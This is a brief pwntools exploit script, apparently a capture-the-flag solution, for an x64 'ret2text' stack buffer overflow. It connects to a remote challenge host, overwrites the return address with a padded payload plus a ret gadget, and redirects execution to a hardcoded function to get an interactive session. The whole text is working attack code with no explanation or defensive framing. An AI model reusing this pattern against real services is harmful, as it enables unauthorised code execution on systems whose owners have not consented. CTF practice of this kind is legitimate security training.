#Made by fly_autumn
#ret2text x64
from pwn import *
p = remote("node5.buuoj.cn",28423)#p = process("./pwn1")
offset = 0xf + 8
fun_addr = 0x401186
ret_addr = 0x401016
payload = b"\x00" * offset + p64(ret_addr) + p64(fun_addr)
p.sendline(payload)
p.interactive()
